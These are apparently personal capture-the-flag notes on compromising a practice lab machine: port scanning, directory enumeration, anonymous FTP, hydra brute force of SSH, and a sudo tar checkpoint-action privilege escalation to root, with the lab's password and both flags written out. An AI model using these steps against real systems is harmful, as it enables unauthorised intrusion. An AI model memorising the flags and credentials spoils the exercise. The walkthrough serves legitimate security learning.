sudo nmap -sC -sV -A -T4 -vv -p- 10.10.200.167
	Agressive mode was needed for this one
		the -T4 is to run nmap faster
		three ports are found, 22, 21 and 80
while running this I also opened the webpage, which worked
I also ran a gobuster on this one 
	gobuster dir -u http://10.10.200.167/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
	Immediantely /images shows up
Lets also see if anonymous can be used to in FTP
	it can, lets see if we can find anything
		get the two txt files
	one shows us what may be a username, Vicious
		However at the bottom someone named lin signed it
	The other looks like a password file, lets save that in a nano and use that password file with hydra
		Lets do both Vicious and lin and use the password file for SSH
			Lin has a password 
				RedDr4gonSynd1cat3
		ssh lin@10.10.200.167
			RedDr4gonSynd1cat3
				ls -la
					we now have user.txt and our first flag
						THM{CR1M3_SyNd1C4T3}
	now lets look at out permissions
		sudo -l
we can see we can use the bin/tar command, tar allows us to create another remote connection and escalate our privileges
	sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
		cd /root/
			ls -la
				there is root.txt
			THM{80UN7Y_h4cK3r}
